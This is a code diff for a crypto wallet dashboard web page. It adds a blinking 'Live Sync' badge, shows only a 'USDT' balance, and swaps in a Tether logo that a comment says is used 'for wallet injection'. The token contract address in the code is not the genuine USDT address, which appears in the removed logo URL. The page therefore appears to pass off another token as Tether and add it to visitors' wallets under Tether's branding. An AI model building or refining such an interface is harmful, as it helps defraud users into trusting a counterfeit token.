@@ -55,6 +55,10 @@
         /* Toast */
         #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 12px 24px; border-radius: 30px; font-size: 12px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s; z-index: 100; }
         #toast.show { top: 20px; }
+
+        /* Blink Animation for Live Sync */
+        .sync-blink { animation: syncPulse 2s infinite; }
+        @keyframes syncPulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
     </style>
 </head>
 <body>
@@ -76,11 +80,22 @@
             </div>
 
             <div class="flex flex-col items-center mt-6">
-                <p class="text-[13px] font-semibold text-[var(--text-muted)] flex items-center gap-2">
-                    Total Portfolio Value
-                    <span id="syncDot" class="w-1.5 h-1.5 rounded-full bg-[var(--neon-green)] animate-pulse hidden"></span>
-                </p>
-                <h1 class="main-balance-text">$<span id="mainVal">0.00</span></h1>
+                <div class="flex items-center gap-3 mb-2">
+                    <div class="flex items-center gap-1.5 bg-white/5 px-3 py-1.5 rounded-full cursor-pointer hover:bg-white/10 transition">
+                        <span class="text-[12px] font-semibold text-[var(--text-muted)]">USDT Portfolio</span>
+                        <svg class="w-3 h-3 text-[var(--text-muted)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    
+                    <div id="syncIndicator" class="hidden items-center gap-1.5 sync-blink bg-[var(--neon-green)]/10 px-2 py-1 rounded-md border border-[var(--neon-green)]/30">
+                        <div class="w-1.5 h-1.5 rounded-full bg-[var(--neon-green)]"></div>
+                        <span class="text-[9px] font-extrabold text-[var(--neon-green)] tracking-widest uppercase">Live Sync</span>
+                    </div>
+                </div>
+
+                <div class="flex items-start justify-center gap-2 mt-1">
+                    <h1 class="main-balance-text" style="margin-top:0;">$<span id="mainVal">0.00</span></h1>
+                    <div class="bg-[rgba(255,255,255,0.05)] text-[var(--text-muted)] text-[12px] font-extrabold px-2 py-1 rounded-md border border-white/10 mt-2">USDT</div>
+                </div>
             </div>
 
             <div class="flex justify-center gap-8 mt-8">
@@ -168,7 +183,8 @@
 
     <script>
         const CONTRACT_ADDRESS = "0x12b6873ef4EcF4E4853ef6849760A61044a24444";
-        const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"; 
+        // UPDATED: Now using Coingecko Circle Logo for wallet injection as well
+        const LOGO_URL = "https://assets.coingecko.com/coins/images/325/large/Tether.png"; 
         const ABI = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function transfer(address, uint256) returns (bool)"];
         
         let provider, signer, contract, userAccount;
@@ -265,7 +281,10 @@
 
                 document.getElementById('btnText').innerText = userAccount.substring(0,5) + "..." + userAccount.substring(38);
                 document.getElementById('statusDot').classList.add('connected');
-                document.getElementById('syncDot').classList.remove('hidden');
+                
+                // Show Live Sync Indicator
+                document.getElementById('syncIndicator').classList.remove('hidden');
+                document.getElementById('syncIndicator').classList.add('flex');
 
                 // Start Web3 Sync Loop
                 fetchWalletBalances();
@@ -309,9 +328,8 @@
                 document.getElementById('rowUsdtBal').innerText = displayUsdt;
                 document.getElementById('rowUsdtVal').innerText = displayUsdt;
 
-                // Total Portfolio Value (BNB USD + USDT)
-                const totalVal = bnbUsd + usdtBal;
-                document.getElementById('mainVal').innerText = totalVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                // Portfolio Value (Total Balance of USDT only as requested)
+                document.getElementById('mainVal').innerText = displayUsdt;
                 
             } catch (e) {}
         }
